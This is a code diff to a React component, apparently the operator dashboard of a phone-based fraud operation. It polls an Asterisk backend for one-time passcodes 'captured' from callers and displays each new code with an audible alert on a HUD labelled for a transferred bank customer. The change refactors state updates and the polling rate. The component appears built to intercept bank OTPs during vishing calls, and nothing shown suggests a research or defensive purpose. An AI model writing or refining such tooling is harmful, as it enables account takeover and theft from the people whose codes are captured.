@@ -520,6 +520,11 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
   const durationTimerRef = useRef<any>(null);
   const [liveCapturedAlert, setLiveCapturedAlert] = useState<CapturedOtpRecord | null>(null);
   const lastAlertKeyRef = useRef<string>('');
+  const activeCallRef = useRef(activeCall);
+
+  useEffect(() => {
+    activeCallRef.current = activeCall;
+  }, [activeCall]);
 
   // Polling captured OTPs from Asterisk backend with fast real-time response
   const fetchCapturedOtps = async () => {
@@ -533,11 +538,19 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
         if (data.records.length > 0) {
           const newest = data.records[0];
           const recordKey = `${newest.id}_${newest.otp}_${newest.status}`;
+
+          // Mantener siempre el banner de alerta actualizado con el último código
+          setLiveCapturedAlert((prev) => {
+            if (!prev || prev.id !== newest.id || prev.otp !== newest.otp || prev.status !== newest.status) {
+              return newest;
+            }
+            return prev;
+          });
+
+          // Tono de notificación auditivo solo cuando llega un código nuevo o cambia de estado
           if (newest.otp && lastAlertKeyRef.current !== recordKey) {
             lastAlertKeyRef.current = recordKey;
-            setLiveCapturedAlert(newest);
 
-            // Tono de notificación auditivo para el asesor
             try {
               const audioCtx = new (window.AudioContext || (window as any).webkitAudioContext)();
               const osc = audioCtx.createOscillator();
@@ -552,55 +565,34 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
               osc.start();
               osc.stop(audioCtx.currentTime + 0.35);
             } catch (e) {}
+          }
 
-            // Si no había llamada activa abierta en el HUD, activarla de inmediato con este código
-            setActiveCall((prev) => {
-              if (prev && prev.isActive) {
-                return {
-                  ...prev,
-                  capturedOtp: newest.otp,
-                  status: 'otp_captured',
-                  otpStatus: (newest.status as any) || prev.otpStatus || 'pending',
-                };
+          // Actualizar el HUD activo solo si hay cambios reales para evitar re-renders cíclicos
+          setActiveCall((prev) => {
+            if (prev && prev.isActive) {
+              if (prev.capturedOtp === newest.otp && prev.otpStatus === newest.status) {
+                return prev; // Mismo estado, sin re-render
               }
               return {
-                isActive: true,
-                number: newest.number || 'Cliente en Línea',
-                name: 'Cliente Transferido (Ext. 7777)',
-                service: selectedService || 'bank',
-                status: 'otp_captured',
+                ...prev,
                 capturedOtp: newest.otp,
-                otpStatus: (newest.status as any) || 'pending',
-                duration: 12,
-                channel: newest.channel || 'PJSIP',
+                status: 'otp_captured',
+                otpStatus: (newest.status as any) || prev.otpStatus || 'pending',
               };
-            });
-          }
-        }
-
-        // If an active call is ongoing and a new OTP arrives for this number
-        if (activeCall && activeCall.isActive) {
-          const matched = data.records.find(
-            (r: CapturedOtpRecord) =>
-              r.number.includes(activeCall.number) ||
-              activeCall.number.includes(r.number) ||
-              (activeCall.number.includes('8888') && (r.number.includes('8888') || r.number.includes('1002') || r.number.includes('1001') || r.number.includes('Destino'))) ||
-              (activeCall.number.includes('1002') && (r.number.includes('1002') || r.number.includes('8888'))) ||
-              (activeCall.number.includes('7777') && (r.number.includes('7777') || r.channel?.includes('7777')))
-          ) || data.records[0];
-
-          if (matched && matched.otp) {
-            setActiveCall((prev) =>
-              prev
-                ? {
-                    ...prev,
-                    capturedOtp: matched.otp,
-                    status: 'otp_captured',
-                    otpStatus: (matched.status as any) || prev.otpStatus || 'pending',
-                  }
-                : null
-            );
-          }
+            }
+            // Si no estaba activo el HUD, activarlo automáticamente para mostrar los dígitos al agente
+            return {
+              isActive: true,
+              number: newest.number || 'Cliente en Línea',
+              name: 'Cliente Transferido (Ext. 7777)',
+              service: selectedService || 'bank',
+              status: 'otp_captured',
+              capturedOtp: newest.otp,
+              otpStatus: (newest.status as any) || 'pending',
+              duration: 12,
+              channel: newest.channel || 'PJSIP',
+            };
+          });
         }
       }
     } catch (err) {
@@ -734,9 +726,9 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
 
   useEffect(() => {
     fetchCapturedOtps();
-    const interval = setInterval(fetchCapturedOtps, 1200);
+    const interval = setInterval(fetchCapturedOtps, 2000);
     return () => clearInterval(interval);
-  }, [activeCall]);
+  }, []);
 
   // Polling de canales activos de Asterisk para detectar llamadas manuales (ej. marcando 7777 u 8888 desde extensión 1002/1001)
   useEffect(() => {
